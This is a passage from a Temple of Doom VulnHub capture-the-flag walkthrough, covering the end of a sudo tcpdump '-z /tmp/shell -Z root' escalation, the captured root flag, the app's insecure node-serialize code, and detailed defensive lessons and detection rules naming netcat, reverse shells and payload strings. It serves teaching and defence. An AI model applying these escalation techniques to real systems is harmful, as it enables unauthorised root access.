> | **`-z /tmp/shell`** | **run this command after each rotation** — our payload |
> | **`-Z root`** | **do NOT drop privileges.** By default `tcpdump` drops to the `tcpdump` user after opening the socket; `-Z root` keeps it as root, so our command runs as root. |
>
> **`-G 1` + `-W 1` is what makes it fast:** rotate once after one second, run `-z`,
> exit. Without `-G` there is no time-based rotation and nothing fires.
>
> **Why `-Z root` is the crux.** `tcpdump` deliberately drops privileges *precisely
> because* it parses untrusted network data. Overriding that with `-Z root` — a
> legitimate flag for capturing as root — re-enables the full blast radius.
>
> **Note `uid=0(root) gid=0(root)`** and the `#` prompt: a genuine root shell, not a
> SUID elevation (which would show `uid=1001 euid=0`).

### 6.3 Root path 2 — the `ss-manager` injection, again, as root

`ss-manager` runs as `fireman`, not root — so this path gives `fireman`, which we
already have. But on some revisions the author also runs a root-owned helper. Check:

```bash
[fireman@localhost ~]$ ps aux | awk '$1=="root" && $11 !~ /^\[/ {print $11,$12,$13}' | sort -u
```

```text
/usr/bin/sshd
/usr/lib/systemd/systemd
/usr/sbin/NetworkManager
/usr/sbin/auditd
/usr/sbin/crond
/usr/sbin/rsyslogd
/usr/bin/dbus-daemon
/usr/libexec/upowerd
```

```bash
[fireman@localhost ~]$ cat /etc/NetworkManager/dispatcher.d/* 2>/dev/null
[fireman@localhost ~]$ ls -la /etc/NetworkManager/dispatcher.d/
total 8
drwxr-xr-x 2 root root 4096 Jun  7  2018 .
drwxr-xr-x 6 root root 4096 Jun  7  2018 ..
-rwxr-xr-x 1 root root  190 Jun  7  2018 00-chrony
```

> NetworkManager dispatcher scripts run as root on interface events — a real escalation
> vector *if writable*. Here it is `root:root 755`, so no. **Check it anyway; on many
> boxes `/etc/NetworkManager/dispatcher.d/` or `/etc/NetworkManager/system-connections/`
> is writable by the `wheel`/network group.**

### 6.4 Read the flag

```bash
[root@localhost ~]# cd /root
[root@localhost ~]# ls -la
total 28
dr-xr-x---.  3 root root 4096 Jun  8  2018 .
dr-xr-xr-x. 18 root root 4096 Jun  7  2018 ..
-rw-r--r--.  1 root root   18 May 11  2018 .bash_logout
-rw-r--r--.  1 root root  176 May 11  2018 .bash_profile
-rw-r--r--.  1 root root  136 May 11  2018 .bashrc
-rw-------.  1 root root 1878 Jun  8  2018 flag.txt
drwx------.  2 root root 4096 Jun  8  2018 .ssh
[root@localhost ~]# cat flag.txt
```

```text
[+] You're a soldier.
[+] One of the best that the world could set against
[+] the demonic invasion.

+-----------------------------------------------------------------------------+
| |       |\                                           -~ /     \  /          |
|~~__     | \                                         | \/       /\          /|
|    --   |  \                                        | / \    /    \     /   |
|      |~_|   \                                   \___|/    \/         /      |
|--__  |   -- |\________________________________/~~\~~|    /  \     /     \   |
|   |~~--__  |~_|____|____|____|____|____|____|/ /  \/|/\ /      \/          \/|
|   |      |~--_|__|____|____|____|____|____|_/ /|    |/ \    /   \       /   |
|___|______|__|_||____|____|____|____|____|__[]/_|----|    \/       \  /      |
|  \mmmm :   | _|___|____|____|____|____|____|___|  /\|   /  \      /  \      |
|      B :_--~~ |_|____|____|____|____|____|____|  |  |\/      \ /        \   |
|  __--P :  |  /                                /  /  | \     /  \          /|
|~~  |   :  | /                                 ~~~   |  \  /      \      /   |
|    |      |/                        .-.             |  /\          \  /     |
|    |      /                        |   |            |/   \          /\      |
|    |     /                        |     |            -_   \       /    \    |
+-----------------------------------------------------------------------------+
|          |  /|  |   |  2  3  4  | /~~~~~\ |       /|    |_| ....  ......... |
|          |  ~|~ | % |           | | ~J~ | |       ~|~ % |_| ....  ......... |
|   AMMO   |  HEALTH  |  5  6  7  |  \===/  |    ARMOR    |#| ....  ......... |
+-----------------------------------------------------------------------------+

		FLAG: kre0cu4jl4rzjicpo1i7z5l1

[+] Congratulations on completing this VM & I hope you enjoyed my first boot2root.

[+] You can follow me on twitter: @0katz

[+] Thanks to the homie: @Pink_P4nther
```

**Flag captured.** ✅

![Root shell and /root/flag.txt](images/06-flag.png)

---

## 7. Other checks worth doing

```bash
[root@localhost ~]# cat /home/nodeadmin/.web/app.js
```

```javascript
const express = require('express');
const serialize = require('node-serialize');
const app = express();

app.get('/', (req, res) => {
    if (req.cookies.profile) {
        const profile = serialize.unserialize(
            Buffer.from(decodeURIComponent(req.cookies.profile), 'base64').toString());
        res.send(`Hello ${profile.username}`);
    } else {
        res.cookie('profile', Buffer.from(JSON.stringify({username:'Admin'})).toString('base64'));
        res.send('Site under construction, come back later.');
    }
});

app.listen(666);
```

> **Reading the author's own code is the best possible debrief.** It confirms exactly
> what § 2.4 predicted: the cookie is base64-decoded and passed straight to
> `serialize.unserialize()` with no validation. `app.listen(666)` also explains the
> port.
>
> **The one-line fix** is to use `JSON.parse` instead — JSON has no function
> representation, so there is nothing to exploit:
> ```javascript
> const profile = JSON.parse(Buffer.from(decodeURIComponent(req.cookies.profile), 'base64'));
> ```

```bash
[root@localhost ~]# cat /etc/shadowsocks-libev/config.json
[root@localhost ~]# cat /root/.bash_history
[root@localhost ~]# ss -tulnp        # confirm 8839 is gone / who owns what now
```

---

## 8. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Web app on a non-standard port (666) | Express | Missed without `-p-` |
| 2 | **Debug mode on — stack traces sent to the client** | `/home/nodeadmin/.web/app.js` | Disclosed the module, file path, line number and service account |
| 3 | **Unsigned, client-side session state** | `profile` cookie = base64 JSON | Attacker fully controls server-side state |
| 4 | **Insecure deserialisation — CVE-2017-5941** | `node-serialize@0.0.4`, `serialize.js:62` | **Unauthenticated RCE** as `nodeadmin` |
| 5 | Abandoned npm dependency (`node-serialize` 0.0.4, unmaintained) | `package.json` | No patch will ever exist |
| 6 | **`ss-manager` command injection in the `method` field** | shadowsocks, UDP `127.0.0.1:8839` | `nodeadmin` → `fireman` |
| 7 | Management daemon bound to loopback treated as safe | UDP 8839 | Defeated the instant an attacker has any local code execution |
| 8 | **`sudo` grant of `tcpdump`** | `/etc/sudoers`: `(ALL) /usr/sbin/tcpdump` | `fireman` → **root** via `-z`/`-Z root` |
| 9 | `ncat` installed with `-e` support | `/usr/bin/ncat` | Made every reverse-shell payload trivial |
| 10 | `gcc` present on a server | `/usr/bin/gcc` | Attackers compile exploits locally |

## 9. Defensive lessons (blue team)

1. **Never deserialise untrusted data with a format that can carry code.** This is the
   one-line summary of the entire box. In Node:
   ```js
   // WRONG — node-serialize can recreate functions
   const state = serialize.unserialize(decode(cookie));

   // RIGHT — JSON has no function representation
   const state = JSON.parse(decode(cookie));
   ```
   The equivalents: `ObjectInputStream` → Jackson/Gson with an allow-list;
   PHP `unserialize()` → `json_decode()`; Python `pickle.loads()` → `json.loads()`;
   Ruby `Marshal.load`/`YAML.load` → `YAML.safe_load`. And if you *must* use a
   dangerous format, sign it (HMAC or a JWT with a real signature) **and** verify the
   signature before deserialising — though that only stops tampering, not a
   legitimately-serialised gadget chain.
2. **Never store session state in a client-side cookie.** Use a server-side session
   store (`express-session` with Redis/Memcached) and put only an opaque session ID in
   the cookie:
   ```js
   const session = require('express-session');
   app.use(session({
     store: new RedisStore({ client: redis }),
     secret: process.env.SESSION_SECRET,   // from the environment, never hard-coded
     cookie: { httpOnly: true, secure: true, sameSite: 'lax' },
     resave: false, saveUninitialized: false,
   }));
   ```
   The client then controls nothing but an unguessable reference.
3. **Audit your dependency tree and remove abandoned packages.** `node-serialize` is
   version **0.0.4**, unmaintained since before the CVE. Find them:
   ```bash
   npm audit --production
   npm outdated
   npx better-npm-audit audit
   # and check for unmaintained deps specifically
   npm ls node-serialize
   ```
   Automate it in CI with Dependabot, Renovate or Snyk, and treat a
   "no release in 2+ years + open CVE" dependency as a blocking issue.
4. **Turn debug mode off in production.** Stack traces disclose module names, file
   paths, line numbers and usernames — everything an attacker needs:
   ```bash
   # /etc/systemd/system/webapp.service
   [Service]
   Environment=NODE_ENV=production
   ```
   Express suppresses stack traces automatically when `NODE_ENV=production`. Verify:
   ```bash
   curl -s -H 'Cookie: profile=broken' http://host:666/ | grep -c 'at Object.exports'
   ```
   It must print `0`.
5. **Grant sudo by capability, not by binary.** `(ALL) /usr/sbin/tcpdump` looks narrow
   and is actually root. Audit every sudoers entry against GTFOBins:
   ```bash
   sudo grep -RhoE '/[A-Za-z0-9_./-]+' /etc/sudoers /etc/sudoers.d/ | sort -u | while read -r b; do
       [ -x "$b" ] && echo "check https://gtfobins.github.io/gtfobins/$(basename "$b")/"
   done
   ```
   `tcpdump`, `vim`, `less`, `find`, `tar`, `python`, `git`, `awk`, `nmap` and dozens
   more all have documented escapes. If a user needs packet captures, give them
   `CAP_NET_RAW` on a dedicated tool, or a wrapper script that fixes the flags.
6. **Do not treat loopback binding as an access control.** `127.0.0.1:8839` hid
   `ss-manager` from every port scan — and it fell the moment anyone had local code
   execution. Authenticate management daemons, restrict them to a UNIX socket with
   `SO_PEERCRED` checks, or firewall them per-UID:
   ```bash
   nft add rule inet filter output meta skuid != fireman udp dport 8839 drop
   ```
7. **Validate every field that reaches a shell.** `ss-manager` interpolated `method`
   unsanitised. Use an allow-list of cipher names, and invoke without a shell:
   ```python
   ALLOWED = {"aes-256-cfb", "chacha20-ietf-poly1305", "aes-128-gcm"}
   if method not in ALLOWED: raise ValueError
   subprocess.run(["/usr/bin/ss-server", "-m", method, "-p", str(port)], shell=False)
   ```
8. **Remove `-e` capable netcat from servers.** Install only OpenBSD `nc` (no `-e`), or
   remove netcat entirely — a server has no business initiating reverse connections.
9. **Remove build tools from production.** `gcc` on a web server turns any foothold
   into a compiled exploit. Build in CI; ship an artefact.
10. **Detection opportunities.**
    - **Alert on any HTTP cookie or POST body containing `_$$ND_FUNC$$_`.** That
      string appears in exactly one context on earth: a node-serialize exploit. It is
      the highest-precision WAF rule you will ever write. Extend it to the family:
      `_$$ND_FUNC$$_`, `java.lang.Runtime`, `javax.script`, `ObjectInputStream`,
      `O:8:"`, `a:2:{`, `pickle`, `__reduce__`.
    - Alert on stack traces in HTTP *responses* (`grep -c 'at .*\.js:' `) — debug mode
      is on in production.
    - Alert on the **process lineage** `node` → `sh`/`bash`/`nc`. A Node web server
      spawning a shell is always an exploit.
    - auditd on sudo usage and on the escalation signature:
      ```bash
      auditctl -a always,exit -F arch=b64 -S execve -F euid=0 -F uid!=0 -k suid_exec
      auditctl -w /etc/sudoers -p wa -k sudoers_change
      ```
      `tcpdump` invoked with `-z` or `-Z root` should be a critical alert.
    - Alert on outbound connections from a server to a non-allow-listed host,
      especially on high ports — the reverse shell.
    - Alert on connections to loopback management sockets from unexpected UIDs
      (auditd `-a always,exit -F arch=b64 -S sendto -F a1=8839`).
    - Alert on `/tmp/shell`, `/tmp/f` or any executable created in `/tmp` by a service
      account.

---

## 10. References

- VulnHub entry: <https://vulnhub.com/entry/temple-of-doom-1,243/>
- Author: 0katz — <https://twitter.com/0katz>, original page
  <https://pinkysplanet.net/temple-of-doom-v1/>
- Community writeups consulted:
  - [egghunter — Temple of Doom: 1 Vulnhub Walkthrough (payload-generation one-liners)](https://medium.com/egghunter/temple-of-doom-1-vulnhub-walkthrough-ec011b5e70ce)
  - [davidsec.blog / l3nsec — Temple of DOOM Vulnhub Walkthrough (local PoC + ss-manager + tcpdump)](https://davidsec.blog/2018-07-14/temple-of-doom-vulnhub-walkthrough/)
  - [Mars's Blog — [Vulnhub] Temple of Doom: 1 Write-up](https://mars-cheng.github.io/blog/2018/Vulnhub-Temple-of-Doom-1-Write-up/)
  - [n33dle — Vulnhub Walkthrough Temple of Doom v1](https://n33dle-security.blogspot.com/2018/07/time-for-anothervulnhub-machine.html)
  - [7hunderson — Temple Of Doom Write-up](https://medium.com/@7hunderson/temple-of-doom-write-up-4462242fe5a8)
  - [Outside Avengers — Temple of Doom CTF Challenge Walkthrough](https://outsideavenger.blogspot.com/2018/09/temple-of-doom-vulnhub-ctf-challenge.html)
  - [lonewolf.raj — VulnHub Temple-Of-Doom](https://lonewolf-raj.medium.com/vulnhub-temple-of-doom-69091b4886a7)
- Exploits / advisories:
  - [CVE-2017-5941 — node-serialize 0.0.4 unserialize() RCE](https://nvd.nist.gov/vuln/detail/CVE-2017-5941)
  - [Exploit-DB 49552 / 49553 — Node.JS 'node-serialize' RCE](https://www.exploit-db.com/exploits/49552)
  - [Ajin Abraham — Exploiting Node.js Deserialization Bug for Remote Code Execution (the original research)](https://opsecx.com/index.php/2017-02-08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)
  - [`nodejsshell.py` payload generator](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py)
  - [Exploit-DB 43006 — Shadowsocks libev `ss-manager` command execution](https://www.exploit-db.com/exploits/43006)
  - [GTFOBins — tcpdump (sudo)](https://gtfobins.github.io/gtfobins/tcpdump/#sudo)
- Background reading:
  - [OWASP Top 10 — A08:2021 Software and Data Integrity Failures (insecure deserialisation)](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)
  - [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
  - [MDN — IIFE (Immediately Invoked Function Expression)](https://developer.mozilla.org/en-US/docs/Glossary/IIFE)
  - [Express.js security best practices](https://expressjs.com/en/advanced/best-practice-security.html) · [`NODE_ENV`](https://expressjs.com/en/advanced/best-practice-performance.html#set-node_env-to-production)
  - [shadowsocks-libev documentation](https://github.com/shadowsocks/shadowsocks-libev)
  - [`tcpdump(8)` man page — `-z`, `-Z`, `-G`, `-W`](https://www.tcpdump.org/manpages/tcpdump.8.html)
  - [`ss(8)`](https://man7.org/linux/man-pages/man8/ss.8.html) · [`lastlog(8)`](https://man7.org/linux/man-pages/man8/lastlog.8.html)
  - [HackTricks — Bypass Python/JS Sandboxes](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-nodejs)
  - [msfvenom Node.js payloads](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/) · [pentestmonkey — Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

---

## 11. Screenshot checklist

- [ ] `images/01-nmap.png` — `nmap -p-` revealing Express on port 666
- [ ] `images/02-stacktrace.png` — the `node-serialize` stack trace and `serialize.js:62`
- [ ] `images/03-shell.png` — the malicious `profile` cookie and the `nodeadmin` shell
- [ ] `images/04-ssmanager.png` — `ps aux` and `ss -tulnp` showing `ss-manager` on UDP 8839
- [ ] `images/05-fireman.png` — the `method` injection and the `fireman` shell
- [ ] `images/06-flag.png` — `sudo tcpdump -z … -Z root` → root → `/root/flag.txt`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md) · [progress](../../docs/PROGRESS.md)._
